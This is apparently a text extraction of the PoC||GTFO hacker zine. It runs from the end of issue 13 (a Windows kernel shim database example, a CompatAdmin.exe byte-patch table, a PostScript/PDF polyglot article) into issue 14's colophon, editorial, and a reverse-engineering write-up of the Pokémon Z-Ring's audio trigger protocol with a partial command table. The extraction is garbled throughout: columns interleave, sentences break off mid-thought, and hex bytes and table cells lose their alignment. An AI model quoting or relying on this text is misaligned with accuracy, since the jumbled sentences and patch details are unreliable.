ing most of the recognised command-line options.
To produce the SDB file that is this article’s ex-
ample, write the following as a Unicode text file
named test.xml:
<?xml version=" 1 . 0 " encoding="UTF−16" ?>
2 < DATABASE NAME =" Hacked D r i v e r Database "
ID=" {F9AB2228−3312−4A73−B6F9−936D70E112EF} ">
4
< LIBRARY >
< KSHIM NAME =" Hacker " FILE=" h a c k e r . s y s "
6
ID=" {919CE4C8−D069−4521−A545 −0132B06394ED}
"
LOGO ="YES" ONDEMAND ="YES" />
8
</LIBRARY >
</DATABASE >
and feed it to the compiler via the command line
1 shimdbc D r i v e r t e s t . xml t e s t . sdb > t e s t . t x t
69File Offset
0x0002FB54
0x0002FB56
0x0002FB57
0x0002FB59
0x0002FB5E
0x0002FB5F
0x0002FB64
0x0002FB66
0x0002FB69
0x0002FB6B
0x0002FB6C
0x0002FB6D
Original
8B FF
55
8B EC
81 EC 88 05 00 00
Patched
EB 08
FF 15 D0 30 49 00
A1 00 60 48 00
33 C5
89 45 FC
8B 45 08
8B C8
E8 55 87 01 00
Remarks
jump to instruction that will use existing fixup site
incorporate existing fixup site at file offset 0x0002FB60
no fixup required for this direct call within .text section
C2 10 00
53
56
Table 2. Patch details for the 32-bit CompatAdmin.exe from the ACT version 6.1 for Windows 8.1.
Ambiguous Cylinder by Kokichi Sugihara
杉原 厚吉 の 多義柱体
result
7010
Post Scriptum: A Schizophrenic Ghost
by Evan Sultanik and Philippe Teuwen
A while back, we asked ourselves,
PostScript Function
/pdfheader
{
Multi-Line PostScript String
(
%!PS-Adobe
%PDF-1.5
%<D0><D4><C5><D8>
What if PoCkGTFO had completely dif-
ferent content depending on whether the
file was rendered by a PDF viewer versus
being sent to a printer?
A PostScript/PDF polyglot seemed inevitable. We
had already done MBR, ISO, TrueCrypt, HTML,
Ruby, . . . Surely PostScript would be simple, right?
As it turns out, it’s actually quite tricky.
PDF Object
9999 0 obj
<<
/Length # bytes between “stream”
and “endstream”
>>
stream
)
}
PostScript Content
Terminates
stop
PostScript
endstream
Interpretation
endobj
$ gv pocorgtfo13.pdf
There were two new challenges in getting this
polyglot to work:
1. The PDF format is a subset of the PostScript
language, meaning that we needed to devise
a way to get a PDF interpreter to ignore the
PostScript code, and vice versa; and
2. It’s almost impossible to find a PostScript
interpreter that doesn’t also support PDF.
Ghostscript is nearly ubiquitous in its use as a
backend library for desktop PostScript view-
ers (e.g., Ghostview), and it has PDF sup-
port, too. Furthermore, it doesn’t have any
configuration parameters to force it to use a
specific format, so we needed a way to force
Ghostscript to always interpret the polyglot
as if it were PostScript.
Remainder of PDF Content
The trick of starting the file with a PostScript
function worked, and the PDF could be viewed
in Adobe. That still leaves the second challenge,
though: We needed a way to trick Ghostscript into
being “schizophrenic” (cf. PoCkGTFO 7:6), vi&., to
insert a parser-specific inconsistency into the poly-
glot that would force Ghostscript into thinking it is
PostScript.
Ghostscript’s logic for auto-detecting file types
seems to be in the dsc_scan_type function in-
side /psi/dscparse.c. It is quite complex, since
this single function must differentiate between seven
different filetypes, including DSC/PostScript and
PDF. It classifies a file as a PDF if it contains a
line starting with “%PDF-”, and PostScript if it con-
tains a line starting with “%!PS-Adobe”. Therefore,
if we put %!PS-Adobe anywhere before %PDF-1.5,
then Ghostscript should be tricked into thinking it is
PostScript! The only caveat is that Adobe blacklists
any PDF that starts with “%!PS-Adobe”, so it can’t
be at the beginning of the file (which is typically
where it occurs in DSC files). But that’s okay, be-
cause Ghostscript only needs it to occur before the
%PDF-1.5, regardless of where.
This article continues in the PostScript!
To overcome the first challenge, we used a sim-
ilar technique to the Ruby polyglot from pocor-
gtfo11.pdf, in which the PDF header is embed-
ded into a multi-line string (delimited by parenthesis
in PostScript), so that it doesn’t get interpreted as
PostScript commands. We halt the PostScript inter-
preter at the end of the PostScript content by using
the handy stop command following the standard
%%EOF “Document Structuring Conventions” (DSC)
directive.
This works, in that it produces a file that is
both a completely valid PDF as well as a completely
valid PostScript program. The trouble is that Adobe
seems to have blacklisted any PDF that starts with
an opening parenthesis. We resolved this by wrap-
ping the multi-line string containing the PDF header
into a PostScript function we called /pdfheader:
7111
Tithe us your Alms of 0day!
from the desk of Pastor Manul Laphroaig,
International Church of the Weird Machines
Dearest neighbor,
Do you remember what it was like when you first
learned to program a computer? Not when you first
realized that you could do it well, but when you first
realized that you could do it at all? How did it feel?
And do you remember what it was like when you
first learned how to use calculus? Not when you
first learned how complicated differential equations
could become, but when you first realized that with
a handful of rules, you could bounce back and forth
between position, velocity, acceleration, and jerk as
if they were all the same thing? How did that feel?
And do you remember what it was like when
you first learned how to use a screwdriver? Not
when you first learned what to do after removing
the screw, but when you first realized that with a
screwdriver—with the right screwdriver—you could
take apart anything? How did that feel?
When I was sixteen, I was a bit of an asshole,
and I asked my automechanics teacher a question
about a distributor’s angular momentum. I don’t
recall my exact question, but I do recall that it was
the sort of thing no one could be expected to know,
and that, being a jerk, I asked it in the vocabulary
of calculus.
Coach Crigger could’ve called me out for be-
ing rude, or he could’ve dodged the question. He
could’ve done any number of things that you might
expect. Instead, he walked out of the classroom
while two and half dozen hooligans started a racket
audible from the other side of the campus.
Ten minutes later, he returned to the classroom.
He walked right up to my desk and slammed a
’72 Ford’s distributor onto my desk along with the
screwdriver to open it. It felt good!
Do this: write an email telling our editors how
to reproduce ONE clever, technical trick from your
research. If you are uncertain of your English, we’ll
happily translate from French, Russian, Southern
Appalachian, and German. If you don’t speak those
languages, we’ll draft a translator from those poor
sods who owe us favors.
Like an email, keep it short. Like an email, you
should assume that we already know more than a
bit about hacking, and that we’ll be insulted or—
WORSE!—that we’ll be bored if you include a long
tutorial where a quick reminder would do.
Just use 7-bit ASCII if your language doesn’t
require funny letters, as whenever we receive some-
thing typeset in OpenOffice, we briefly mistake it
for a ransom note. Don’t try to make it thorough
or broad. Don’t use bullet-points, as this isn’t a
damned Powerpoint deck. Keep your code samples
short and sweet; we can leave the long-form code as
an attachment. Do not send us L A TEX; it’s our job
to do the typesetting!
Don’t tell us that it’s possible; rather, teach us
how to do it ourselves with the absolute minimum
of formality and bullshit.
Like an email, we expect informal (or faux-
biblical) language and hand-sketched diagrams.
Write it in a single sitting, and leave any editing
for your poor preacherman to do over a bottle of
fine scotch. Send this to pastor@phrack org and
hope that the neighborly Phrack folks—praise be to
them!—aren’t man-in-the-middling our submission
process.
Yours in PoC and Pwnage,
Pastor Manul Laphroaig, D D
72PoC|| GTFO
P
r
o
o
f
o
f
C
o
n
c
e
p
t
o
r
G
e
t
T
h
e
F
u
c
k
O
u
t
PASTOR LAPHROAIG SCREAMS
HIGH FIVE TO THE HEAVENS
AS THE WHOLE
WORLD GOES UNDER
14:02 Z-Ring Phreaking
14:03 Concerning Desert Studies
14:04 Flush+Reload Side-Channel Attacks
14:05 Anti-Keylogging with Random Noise
14:06 Random NOPs on ARM
14:07 Ethernet Over GDB
14:08 Control Panel Vulnerabilities
14:09 MD5 Postscript
14:10 MD5 PDF
14:11 MD5 GIF
14:12 This PDF is an NES MD5 Quine
Gott bewahre mich vor jemand, der nur ein Büchlein gelesen hat; это самиздат.
. March 20, 2017.
The MD5 hash of this PDF is
29 Pengő (3 × 10 8 Adópengő).
10
×
6
0, $0 USD, $0 AUD, 10s 6d GBP, 0 RSD, 0 SEK, $50 CAD,Legal Note: Tip your bartender.
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t deserve. Please
mirror—don’t merely link!—pocorgtfo14.pdf and our other issues far and wide, so our articles can help fight
the coming flame deluge. We like the following mirrors.
https://unpack.debug.su/pocorgtfo/
https://pocorgtfo.hacke.rs/
https://www.alchemistowl.org/pocorgtfo/
https://www.sultanik.com/pocorgtfo/
Technical Note: This file, pocorgtfo14.pdf, is a polyglot valid as a Nintendo Entertainment Sys-
tem (NES) ROM cartridge, a PDF document, and a ZIP archive. We collided 9,824 MD5 block pairs
to place the hash of this document on its front cover and the title screen of the NES game, but only 609 of
them made it to the final release.
Cover Art: The cover illustration from this issue is by William E. Damon, first published in Ocean
Wonders: A Companion for the Seaside in 1879.
Printing Instructions: Pirate print runs of this journal are most welcome! PoCkGTFO is to be printed
duplex, then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”) paper in
Samland, then fold to get a booklet in A4 or Letter size. Secret volcano labs in Canada may use P3 (280 mm
x 430 mm) if they like, folded to make P4. The outermost sheet should be on thicker paper to form a cover.
# This is how to convert an issue for duplex printing.
sudo apt-get install pdfjam
pdfbook --short-edge --vanilla --paper a3paper pocorgtfo14.pdf -o pocorgtfo14-book.pdf
Man of The Book
Manul Laphroaig
Editor of Last Resort
Melilot
TEXnician
Evan Sultanik
Editorial Whipping Boy
Jacob Torrey
Funky File Supervisor
Ange Albertini
Assistant Scenic Designer Philippe Teuwen
and sundry others
214:01
Let us share some water
Neighbors, please join me in reading this fif-
teenth release of the International Journal of Proof
of Concept or Get the Fuck Out, a friendly little
collection of articles for ladies and gentlemen of dis-
tinguished ability and taste in the field of reverse
engineering and the study of weird machines. This
release is a gift to our fine neighbors in Heidelberg,
Canberra, and Miami.
If you are missing the first fourteen issues, we
suggest asking a neighbor who picked up a copy of
the first in Vegas, the second in São Paulo, the third
in Hamburg, the fourth in Heidelberg, the fifth in
Montréal, the sixth in Las Vegas, the seventh from
his parents’ inkjet printer during the Thanksgiv-
ing holiday, the eighth in Heidelberg, the ninth in
Montréal, the tenth in Novi Sad or Stockholm, the
eleventh in Washington D.C., the twelfth in Heidel-
berg, the thirteenth in Montréal, or the fourteenth
release in São Paulo, San Diego, or Budapest.
After our paper release, and only when quality
control has been passed, we will make an electronic
release named pocorgtfo14.pdf. It is a valid PDF,
ZIP, and a cartridge ROM for the Nintendo Enter-
tainment System (NES).
On page 5, Vicki Pfau shares with us the story
of how she reverse engineered the Pokémon Z-Ring,
an accessory for the Nintendo 3DS whose wireless
connection uses audio, rather than radio. In true
PoCkGTFO spirit, she then re-implements this pro-
tocol for the classic GameBoy.
Pastor Manul Laphroaig is back with a new
sermon on page 12 concerning Liet Kynes, water,
Desert Studies, and the Weirding Way.
Taylor Hornby on page 14 shares with us some
handy techniques for communicating between pro-
cessors by reading shared memory pages, without
writes.
Mike Meyers on page 19 shares some tricks for
breaking Windows user-mode keyloggers through
the injection of fake events.
Niek Timmers and Albert Spruyt consider a
rather specific, but in these days important, ques-
tion in exploitation: suppose that there is a region
of memory that is encrypted, but not validated or
write-protected. You haven’t got the key, so you’re
able to corrupt it, but only in multiples of the block
size and only without a clue as to which bits will
become what. On page 26, they calculate the odds
of that corrupted code becoming the equivalent of
a NOP sled in ARM and Thumb, in userland and
kernel, on bare metal and in emulation.
In PoCkGTFO 13:4, Micah Elizabeth Scott
shared with us her epic tale of hacking a Wacom
tablet. Her firmware dump in that article depended
upon voltage-glitching a device over USB, which is
made considerably easier by underclocking both the
target and the USB bus. That was possible because
she used the synchronous clock on an SPI bus to
shuffle USB packets between her underclocked do-
main and realtime. In her latest article, to be found
on page 30, she explains how to bridge an under-
clocked Ethernet network by routing packets over
GDB, OpenOCD, and a JTAG/SWD bus.
3Geoff Chappel is back again, ready to take you to
a Windows Wonderland, where you will first achieve
a Mad Hatter’s enlightenment, then wonder what
the Caterpillar was smoking. Seven years after the
Stuxnet hype, you will finally get the straight ex-
planation of how its Control Panel shortcuts were
abused. Just as in 2010, when he warned that bugs
might remain, and in 2015 when Microsoft admitted
that bugs did in fact remain, Geoff still thinks that
some funny behaviors are lurking inside of the Con-
trol Panel and .LNK files. You will find his article
on page 37, and remember what the dormouse said!
With the recent publication of a collided SHA1
PDF by the good neighbors at CWI and Google Re-
search, folks have asked us to begin publishing SHA1
hashes instead of the MD5 sums that we tradition-
ally publish. We might begin that in our next re-
lease, but for now, we received a flurry of nifty MD5
collisions. On page 46, Greg Kopf will show you
how to make a PostScript image that contains its
own checksum. On page 50, Mako describes a nifty
trick for doing the same to a PDF, and on page 53
is Kristoffer Janke’s trick for generating a GIF that
contains its own MD5 checksum.
On page 56, the Evans Sultanik and Teran de-
scribe how they coerced this PDF to be an NES
ROM that, when run, prints its own MD5 check-
sum.
On page 60, the last page, we pass around the
collection plate. Our church has no interest in cash
or wooden nickels, but we’d love your donation of a
nifty reverse engineering story. Please send one our
way.
414:02
Z-Ring Phreaking from a Gameboy
by Vicki Pfau
At the end of last year (following their usual
three-year cycle), Nintendo released a new gener-
ation of Pokémon games for their latest portable
console, the Nintendo 3DS. This time, their new
entry in the series spectacularly destroyed several
sales records, becoming the most pre-ordered game
in Nintendo’s history. And of course, along with a
new Pokémon title, there are always several things
that follow suit, such as a new season of the long
running anime, a flood of cheapo toys, and datamin-
ing the latest games into oblivion. This article is
not about the anime or the datamining; rather, it’s
about one of the cheapo toys.
Nebby responds by blowing up the bridge. The
player and Nebby fall to their certain doom, only
to be saved by the Guardian Pokémon of the is-
land, Tapu Koko, who grabs them right before they
hit the bottom of the ravine. Tapu Koko flies up
to where Lillie is watching in awe, and delivers the
pair along with an ugly stone that happens to have
a well-defined Z shape on it. This sparkling stone
is crafted by the kahuna of the island 2 into what is
known as a Z-Ring. So obviously there’s a toy of
this.
In the game, the Z-Ring is an ugly, bulky stone
bracelet given to random 11-year old children. You
shove sparkling Z-Crystals onto it, and it lets you
activate special Z-Powers on your Pokémon, unlock-
ing super-special-ultimate Z-Moves to devastate an
opponent. In real life, the Z-Ring is an ugly, bulky
plastic bracelet given to random 11-year old chil-
dren. You shove plastic Z-Crystals onto it, and it
plays super-compressed audio as lights flash, and
the ring vibrates a bit. More importantly, when
you activate a Z-Power in-game, it somehow signals
the physical Z-Ring to play the associated sound, re-
gardless of which cheap plastic polyhedron you have
inserted into it at the time. How does it communi-
cate? Some people speculated about whether the in-
terface was Bluetooth LE or a custom wireless com-
munication protocol, but I have not seen anyone else
reverse it. I decided to dig in myself.
The two new games, Pokémon Sun and Pokémon
Moon, focus on a series of four islands known as
Alola in the middle of the ocean. Alola is totally
not Hawaii. 1 The game opens with a cutscene of a
mysterious girl holding a bag and running away from
several other mysterious figures. Near the beginning
of the game, the player character runs into this mys-
tery girl, known as Lillie, as she runs up to a bridge,
and a rare Pokémon named Nebby pops out of the
bag and refuses to go back in. It shudders in fear on
the bridge as it’s harried by a pack of birds—sorry,
Flying type—Pokémons. The player character runs
up to protect the Pokémon, but instead gets pecked
at mercilessly.
The toy is rather overpriced compared to its
build quality, but, having seen one at a store re-
cently, I decided to pick it up and take a look. Af-
ter all, I’d done only minimal hardware reversing,
and this seemed to be a good excuse to do more.
The package included the Z-Ring bracelet, three Z-
Crystals, and a little Pikachu toy. Trying to unbox
it, I discovered that the packaging was horrendous.
It’s difficult to remove all of the components with-
out breaking anything. I feel sorry for all of the kids
who got this for Christmas and then promptly broke
off Pikachu’s tail as they eagerly tried to remove it
from the plastic.
1 Yes
2 Did
it is.
I mention that we’re not in Hawaii? I was lying.
5pecting the audio to be in ultrasonic range, I cranked
up the sample rate to 96 kHz (although whether or
not my laptop microphone can actually detect sound
above 22 kHz is questionable) and stared at it in Au-
dacity’s spectrogram mode. Although I saw a few
splotches at the top of the audible range, playing
them back did not trigger the Z-Ring at all. How-
ever, playing back the whole recording did. I tried
playing subsets of the sample until I found portions
that triggered the Z-Ring. As I kept cropping the
audio shorter and shorter, I finally found what I was
looking for. The trigger wasn’t ultrasonic. It was in
fact completely audible.
The bracelet itself has slots on the sides to hold
six Z-Crystals and one on the top that has the signa-
ture giant Z around it. The slot on the top has three
pogo pins, which connect to pads on a Z-Crystal.
The center of these is GND, with one pin being used
to light the LED through a series resistor (R1, 56 Ω)
and the other pin being used to sense an identity re-
sistor (R2, 18 kΩ for green).
It also has a tri-state switch on the side. One set-
ting (Mode I) is for synchronizing to a 3DS, another
(Mode II) is for role-play and synchronizes with six
tracks on the Sun/Moon soundtrack, and the final
(neutral) setting is the closest thing it has to an off
mode. A button on the side will still light up the
device in the neutral setting, presumably for store
demo reasons.
My first step in trying to reverse engineer the
device was figuring out how to pair it with my 3DS.
Having beaten my copy of Pokémon Sun already, I
presumably had obtained anything needed in-game
to pair with the device, but there was no explicit
mention of the toy in-game. Included in the toy’s
packaging were two tiny pamphlets, one of which
was an instruction manual. However, the instruc-
tion manual was extremely minimal and mostly just
described how to use the toy on its own. The only
thing I could find about the 3DS interface was an
instruction to turn up the 3DS volume and set the
audio to stereo. There was also a little icon of head-
phones with a line through them. I realized that
it didn’t pair with the 3DS at all. It was sound-
triggered!
I pulled out my 3DS, loaded up the game, and
tried using a Z-Power in-game with the associated Z-
Crystal inserted into the top of the toy. Sure enough,
with the sound all the way up, the Z-Ring activated
and synchronized with what the game was doing.
Now that I knew I’d need to record audio from
the game, I pulled up Audacity on my laptop and
started recording game audio from the speakers. Ex-
When you activate a Z-Power in the game, a
short little jingle always plays. I had previously as-
sumed that the jingle was just for flavor, but when
I looked at it, there were several distinctive lines
on the spectrogram. The very beginning of the jin-
gle included seven different tones, so I tried playing
back that section. Sure enough, the Z-Ring acti-
vated. I cropped it down to the first four tones,
and the Z-Ring would reliably activate and play a
specific sample whenever I played the audio back.
Rearranging the tones, I got it to play back a dif-
ferent sample. That was how to signal the toy, but
now the task was finding all of the samples stored
on the Z-Ring without dumping the ROM.
Looking at the recording in the spectrogram, it
was pretty clear that the first tone, which lasts all
of 40 milliseconds and is a few hundred hertz lower
than the rest of the signal, is a marker indicating
that the next few tones describe which sample to
play back. I quickly reconstructed the four tones
as just sine waves in Audacity to test my hypothe-
sis, and sure enough, I was able to trigger the tones
using the constructed signal as well. However, that
was a tedious process and did not lend itself to being
able to explore and document all of the tone combi-
nations. I knew I needed to write some software to
help me quickly change the tones, so I could docu-
ment all the combinations. Since it looked as if the
signal was various combinations of approximately
four different frequencies, it would take some explo-
ration to get everything.
I’m lazy and didn’t feel like writing a tone gen-
erator and hooking it up to an audio output de-
vice and going through all of the steps I’d need to
get sine waves of programmatically-defined frequen-
cies to come out of my computer. However, I’m a
special kind of lazy, and I really appreciate irony.
The game is for the 3DS, right? What system is
6Pokémon famous for originating on? The original
Game Boy, a platform with hardware for generating
audible tones! Whereas the 3DS also has a micro-
phone, the audio communication is only used in one
direction. Perfect!
Now, I’d never written a program for the Game
Boy, but I had implemented a Game Boy emula-
tor. Fixing bugs on an emulator requires debug-
ging both the emulator and the emulated software at
the same time, so I’m quite familiar with the Game
Boy’s unique variant of Z80, making the barrier of
entry significantly lower than I thought it would be.
I installed Rednex GameBoy Development System, 3
one of the two most popular toolchains for compil-
ing Game Boy homebrew ROMs, and wrote a few
hundred lines of assembly. I figured the Game Boy’s
audio channel 3, which uses 32-sample wavetables of
four-bit audio, would be my best chance to approx-
imate a sine wave. After a bit of experimenting, I
managed to get it to create the right tones. But the
first obstacle to playing back these tones properly
was the timing. The first tone plays for 40 millisec-
onds, and the remaining tones each last 20 millisec-
onds. A frame on the GB is roughly 16 milliseconds
long, so I couldn’t synchronize on frame boundaries,
yet I found a busy loop to be impractical. (Yes, GB
games often use busy loops for timing-sensitive op-
erations.) Fortunately, the GB has a built-in timer
that can fire an interrupt after a given number of
cycles, so, after a bit of math, I managed to get the
timing right. Success! I could play back a series of
tones from a table in RAM with the right timing
and the right frequencies.
0
Sure enough, when I played this back in an em-
ulator, the Z-Ring activated! The ROM plays the
tones upon boot and had no user interface for config-
uring which tones to play, but recompiling the ROM
was fast enough that it wasn’t really an issue.
The natural next step was uploading the pro-
gram to a real Game Boy. I quickly installed the
program onto a flash cart that I had purchased while
developing the emulator. I booted up my original
Game Boy, the tones played, and. . . the Z-Ring did
not activate. No matter how many times I restarted
the program, the tones would not activate the Z-
Ring. I recorded the audio it was playing, and
the tones were right. I was utterly confused until
I looked a bit closer at the recording: the signal
was getting quieter with every subsequent tone. I
thought that this must be a bug in the hardware, as
the Game Boy’s audio hardware is notorious for hav-
ing different quirks between models and even CPU
revisions. I tried turning off the audio channel and
turning it back on again a few cycles later to see if
that fixed anything. It still worked in the emulator,
so I put it back on the flash cart, and this time it
worked! I could consistently trigger one of the sam-
ples I’d seen, but some of the other ones seemed to
randomly select one of three tones to play. Some-
thing wasn’t quite right with my tone generation, so
I decided to halve the sample period, which would
give me more leeway to finely adjust the frequency.
This didn’t appear to help at all, unfortunately.
Scoping out all of the combinations of the tones I
thought were in range yielded about 30 responses
out of the 64 combinations I tried. Unfortunately,
many of the responses appeared to be the same, and
many of them weren’t consistent. Additionally, sam-
ples I knew the Z-Ring had were not triggered by
any of these combinations. Clearly something was
wrong.
100 ms
I needed a source of several unique known-good
signals, so I scoured YouTube and found an “All Z-
Moves” video. Sure enough, it triggered from the
Z-Ring a bunch of reactions I hadn’t seen yet. Tak-
ing a closer look, I saw that the signal was actually
all seven tones (not four), so extending the program
to use seven tones suddenly yielded much more con-
sistent results. Great! The bad news was that be-
yond the first, fixed tone, there were four variations
of each subsequent tone, leading to a total of 4 6
combinations. That’s 4,096. That’s a lot to scope
out. I decided to take another route and catalog ev-
5 kHz
0 kHz
3 unzip
pocorgtfo14.pdf rgbds.zip
7ery signal in the video as a known pattern. I could
try other signals later. Slowly, I went through the
video and found every trigger. It seemed that there
were two separate commands per move: one was for
the initial half of the scene, where the Pokémon is
“surrounded by Z-Power,” and then the actual Z-
Move was a separate signal. Unfortunately, three of
the former signals had been unintentionally cropped
from the video, leaving me with holes in my data.
Sitting back and looking at the data, I started notic-
ing patterns. I had numbered each tone from 0 (the
lowest) to 3 (the highest), and every single one of
the first 15 signals (one for each of the 18 Pokémon
types in-game, minus the three missing types) ended
with a 3. Some of the latter 18 (the associated Z-
Powers per type) ended with a 1, but most ended
with a 3. I wasn’t quite sure what that meant until
I saw that other tones were either a 0 or a 2, and the
remainder were either a 1 or a 3. Each tone encoded
only one bit, and they were staggered to make sure
the adjacent bits were differentiable!
This reduced the number of possibilities from
over four thousand to a more manageable sixty-four.
It also lent itself to an easy sorting technique, with
the last bit being MSB and the first being LSB. As I
sorted the data, I noticed that the first 18 fell neatly
into the in-game type ordering, leaving three holes
for the missing types, and the next 18 all sorted
identically. This let me fill in the holes and left
me with 36 of the 64 combinations already filled in.
I also found 11 special, Pokémon-specific (instead
of type-specific) Z-Moves, giving me 47 total signals
and 17 holes left. As I explored the remaining holes,
I found five audio samples of Pikachu saying differ-
ent things, and the other 12 didn’t correspond to
anything I recognized.
4 git
In the process, I added a basic user interface to
the Game Boy program that lets you either select
from the presets or set the tones manually. Given
the naming scheme of these Z-Crystals (for any given
type or Pokémon, it would basically just be Typium-
Z, e.g. Fire becomes Firium-Z), I naturally decided
to name it Phreakium-Z. 4
I thought I had found all of the Z-Ring’s sound
triggers, but it was pointed out to me while I was
preparing to publish my results that the official
soundtrack release had six “Z-Ring Synchronized”
tracks that interfaced with the Z-Ring. I had al-
ready purchased the soundtrack, so I took a look
and tried playing back the tracks with the Z-Ring
nearby. Nothing happened. More importantly, the
distinctive jingle of the 5 kHz tones was completely
absent from the tracks. So what was I missing? I
tried switching it from Mode I into Mode II, and the
Z-Ring lit up, perfectly synchronizing with the mu-
sic. But where were the triggers? There was noth-
ing visible in the 4–6 kHz range this time around.
Although I could clip portions of tracks down to spe-
cific triggers, I couldn’t see anything in the spectro-
gram until I expanded the visible range all the way
up to 20 kHz. This time the triggers were indeed
ultrasonic or very nearly so.
Human hearing caps out at approximately
20 kHz, but most adults can only hear up to about
15 kHz. The sample rates of sound devices are typ-
ically no greater than 48 kHz, allowing the produc-
tion of frequencies up to 24 kHz, including only a
narrow band of ultrasonic frequencies. Given the
generally poor quality of speakers at extremely high
frequencies, you can imagine my surprise when I saw
a very clear signal at around 19 kHz.
clone https://github.com/endrift/phreakium-z; unzip pocorgtfo14.pdf phreakium-z.zip
8brations and light colors that corresponded to the
animation of a Z-Move in game, a response included
only one sound effect coupled with one lighting ef-
fect or one lighting effect with one vibration effect.
There was also a series of sound effects that did not
appear in Mode I and that seemed to be linked to
individual Pokémon types. Many of the responses
seemed randomly ordered, almost as though the de-
velopers had added the commands ad hoc without
realizing that ordering similar responses would be
sensible. Huge swaths of the command set ended
up being the Cartesian product of a light color with
a vibration effect. This ended up being enough of
the command set that I was able to document the
remainder of the commands within only a handful
of hours.
Most of the individual commands weren’t inter-
esting, but I did find eight additional Pikachu voice
samples and a rather interesting command that —
when played two or three times in a row — kicked the
Z-Ring into what appeared to be a diagnostic mode.
It performed a series of vibrations followed by a se-
ries of tones unique to this response, after which the
Z-Ring stopped responding to commands. After a
few seconds, the light on the bottom, which is com-
pletely undocumented in the manual and had not il-
luminated before, started blinking, and the light on
top turned red. However, it still didn’t respond to
any commands. Eventually I discovered that switch-
ing it to the neutral mode would change the light to
blue for a few seconds, and then the toy would re-
vert to a usable state. I’m still unsure of whether
this was a diagnostic mode, a program upload mode,
or something completely different.
By this point I’d put in several hours over a
few days into figuring out every nook and cranny of
this device. Having become bored with it, I decided
to bite the bullet and disassemble the hardware. I
found inside a speaker, a microphone, a motor with a
lopsided weight for generating the vibrations, and a
PCB. The PCB, although rather densely populated,
did not contain many interesting components other
than an epoxy blob labeled U1, an MX25L8006E
flash chip labeled U2, and some test points. You
will find a dump of this ROM attached. 6 At this
point, I decided to call it a week and put the Z-Ring
back together; it was just a novelty, after all.
Zooming in, I saw the distinctive pattern of a
lower, longer initial tone followed by several stag-
gered data tones. However, this time it was a 9-bit
signal, with a 60 ms initial tone at exactly 18.5 kHz
and a 20 ms gap between the bits. Unfortunately,
18 kHz is well above the point at which I can get any
fine adjustments in the Game Boy’s audio output, so
I needed to shift gears and actually write something
for the computer. At first I wrote something quick in
Rust, but this proved to be a bit tedious. I realized
I could make something quite a bit more portable:
a JavaScript web interface using WebAudio. 5
After narrowing down the exact frequencies used
in the tones and debugging the JavaScript (as it
turns out, I’ve gotten quite rusty), I whipped up
a quick interface that I could use to explore com-
mands. After all, 512 commands is quite a bit more
than the 64 from Mode I.
Despite being a larger number of combinations,
512 was still a reasonable number to explore in a
few hours. After I got the WebAudio version work-
ing consistently, I added the ability to take a num-
ber from 0 to 511 and output the correspondingly
indexed tone, and I began documenting the individ-
ual responses generated. At first I was getting oddly
erratic sequences, until I realized that I was parsing
a base 10 number as a base 16 index. With that
fixed, everything fell into place. I noticed that the
first 64 indices of the 512 were in fact identical to
the 64 Mode I tones, so that was quick to document.
Once I got past the initial 64, I noticed that the re-
sponses from the Z-Ring no longer corresponded to
game actions but were instead more granular single
actions. For example, instead of a sequence of vi-
5 git
clone https://github.com/endrift/phreakium-js; unzip pocorgtfo14.pdf phreakium-js.html
pocorgtfo14.pdf zring-flash.bin
6 unzip
9These are the 512 commands of the Z-Ring.
000:
001:
002:
003:
004:
005:
006:
007:
008:
009:
00A:
00B:
00C:
00D:
00E:
00F:
010:
011:
012:
013:
014:
015:
016:
017:
018:
019:
01A:
01B:
01C:
01D:
01E:
01F:
020:
021:
022:
023:
024:
025:
026:
027:
028:
029:
02A:
02B:
02C:
02D:
02E:
02F:
030:
031:
032:
033:
034:
035:
036:
037:
038:
039:
03A:
03B:
03C:
03D:
03E:
03F:
040:
041:
042:
043:
044:
Normalium-Z
Firium-Z
Waterium-Z
Grassium-Z
Electrium-Z
Icium-Z
Fightium-Z
Poisonium-Z
Groundium-Z
Flyium-Z
Psychium-Z
Buginium-Z
Rockium-Z
Ghostium-Z
Dragonium-Z
Darkium-Z
Steelium-Z
Fairium-Z
Breakneck Blitz
Inferno Overdrive
Hydro Vortex
Bloom Doom
Gigavolt Havoc
Subzero Slammer
All-Out Pummeling
Acid Downpour
Tectonic Rage
Supersonic Skystrike
Shattered Psyche
Savage Spin-Out
Continental Crush
Never-Ending Nightmare
Devastating Drake
Black Hole Eclipse
Corkscrew Crash
Twinkle Tackle
Sinister Arrow Raid (Decidium-Z)
Malicious Moonsault (Incinium-Z)
Oceanic Operetta (Primarium-Z)
Catastropika (Pikachunium-Z)
Guardian of Alola (Tapunium-Z)
Stoked Sparksurfer (Aloraichium-Z)
Pulverizing Pancake (Snorlium-Z)
Extreme Evoboost (Eevium-Z)
Genesis Supernova (Mewium-Z)
Soul-Stealing 7-Star Strike (Marshadium-Z)
(unknown)
(unknown)
10,000,000 Volt Thunderbolt (Pikashunium-Z)
(unknown)
(unknown)
(unknown)
(unknown)
(unknown)
(unknown)
(unknown)
(unknown)
Pikachu 1
Pikachu 2
Pikachu 3
Pikachu 4
Pikachu 5
(unknown)
(no response)
SFX/Light (Normal)
SFX/Light (Fire)
SFX/Light (Water)
SFX/Light (Grass)
SFX/Light (Electric)
045:
046:
047:
048:
049:
04A:
04B:
04C:
04D:
04E:
04F:
050:
051:
052:
053:
054:
055:
056:
057:
058:
059:
05A:
05B:
05C:
05D:
05E:
05F:
060:
061:
062:
063:
064:
065:
066:
067:
068:
069:
06A:
06B:
06C:
06D:
06E:
06F:
070:
071:
072:
073:
074:
075:
076:
077:
078:
079:
07A:
07B:
07C:
07D:
07E:
07F:
080:
081:
082:
083:
084:
085:
086:
087:
088:
089:
SFX/Light (Ice)
SFX/Light (Fighting)
SFX/Light (Poison)
SFX/Light (Ground)
SFX/Light (Flying)
SFX/Light (Psychic)
SFX/Light (Bug)
SFX/Light (Rock)
SFX/Light (Ghost)
SFX/Light (Dragon)
SFX/Light (Dark)
SFX/Light (Steel)
SFX/Light (Fairy)
(no response)
Vibration (soft, short)
Vibration (soft, medium)
Vibration (pattern 1)
Vibration (pattern 2)
Vibration (pattern 3)
Vibration (pattern 4)
Vibration (pattern 5)
Vibration (pattern 6)
Vibration (pattern 7)
Vibration (pattern 8)
Vibration (pattern 8)
Vibration (pattern 9)
Vibration (pattern 10)
Vibration (pattern 11)
Vibration (pattern 12)
Vibration (pattern 13)
Vibration (pattern 14)
Light (yellow)
Light (pale blue)
Light (white)
Light (pattern 1)
Light (pattern 2)
Vibration (pattern 15)
Vibration (pattern 16)
Light/Vibration (red, very short)
